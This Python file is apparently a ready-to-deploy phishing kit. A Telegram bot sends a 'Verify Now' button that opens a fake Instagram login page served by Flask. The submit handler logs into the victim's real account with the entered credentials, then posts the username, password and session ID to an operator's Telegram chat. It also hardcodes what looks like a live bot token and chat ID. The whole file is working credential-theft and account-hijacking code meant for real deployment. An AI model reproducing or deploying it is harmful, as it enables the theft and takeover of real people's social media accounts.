import os
import json
import threading
import requests
from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from instagrapi import Client

# ==========================================
# ১. এখানে আপনার তথ্যগুলো বসান
BOT_TOKEN = '9213115853:AAExh_cX7Ve--ze-V7artxpgYmUYewG-lXs'
ADMIN_CHAT_ID = '5428249457' 
WEB_APP_URL = 'https://hlo-world.onrender.com' # আপনার Render এর লিংক
# ==========================================

# --- টেলিগ্রাম বট সেটআপ ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Verify Now", web_app=WebAppInfo(url=WEB_APP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Please verify your account to continue:", 
        reply_markup=reply_markup
    )

def run_bot():
    print("Starting Telegram Bot...")
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.run_polling()

# --- ওয়েবসাইট সেটআপ (Flask) ---
web_app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #fff; border: 1px solid #dbdbdb; padding: 40px 30px; width: 320px; text-align: center; border-radius: 3px; }
        .logo { font-family: 'Billabong', cursive; font-size: 40px; margin-bottom: 30px; color: #262626; }
        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 14px; }
        input:focus { outline: none; border: 1px solid #a8a8a8; }
        button { width: 100%; padding: 10px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; }
        button:disabled { background-color: #b2dffc; cursor: not-allowed; }
        .error { color: #ed4956; font-size: 14px; margin-top: 15px; display: none; }
        .success { color: #0095f6; font-size: 14px; margin-top: 15px; display: none; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; }
        .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #dbdbdb; margin: 0 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">Instagram</div>
        <form action="/submit" method="POST" onsubmit="showLoading()">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" id="loginBtn">Log In</button>
        </form>
        <div class="divider">OR</div>
        <p style="color: #385185; font-size: 14px; font-weight: bold; cursor: pointer;">Forgot password?</p>
        <div id="errorMsg" class="error"></div>
        <div id="successMsg" class="success"></div>
    </div>
    <script>
        function showLoading() {
            document.getElementById('loginBtn').innerText = "Logging in...";
            document.getElementById('loginBtn').disabled = true;
        }
    </script>
</body>
</html>
"""

@web_app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@web_app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    
    try:
        cl = Client()
        if os.path.exists('session.json'):
            try:
                with open('session.json', 'r') as f:
                    cl.set_settings(json.load(f))
            except:
                pass
        
        cl.login(username, password)
        session_id = cl.sessionid
        
        with open('session.json', 'w') as f:
            json.dump(cl.get_settings(), f)
        
        send_to_telegram(username, password, session_id)
        return render_template_string(HTML_PAGE.replace('<div id="successMsg" class="success"></div>', '<div class="success" style="display:block;">Login Successful.</div>'))
        
    except Exception as e:
        send_error_to_telegram(username, str(e))
        return render_template_string(HTML_PAGE.replace('<div id="errorMsg" class="error"></div>', '<div class="error" style="display:block;">Sorry, your password was incorrect.</div>'))

def send_to_telegram(user, pw, sess_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    text = f"🔔 **New Login**\n\n👤 User: `{user}`\n🔑 Pass: `{pw}`\n🔗 Session: `{sess_id}`"
    requests.post(url, json={"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"})

def send_error_to_telegram(user, error_msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    text = f"❌ **Login Failed**\n\n👤 User: `{user}`\n⚠️ Error: `{error_msg}`"
    requests.post(url, json={"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"})

# ==========================================
# ৩. একসাথে বট এবং ওয়েবসাইট চালানো (গুরুত্বপূর্ণ)
# ==========================================
# বট থ্রেডটি মেইন ব্লকের বাইরে রাখা হলো, যাতে Render এটি মিস না করে
bot_thread = threading.Thread(target=run_bot, daemon=True)
bot_thread.start()

if __name__ == '__main__':
    # Render এর পোর্ট নেওয়া
    port = int(os.environ.get('PORT', 5000))
    print(f"Starting Web Server on port {port}...")
    web_app.run(host='0.0.0.0', port=port)
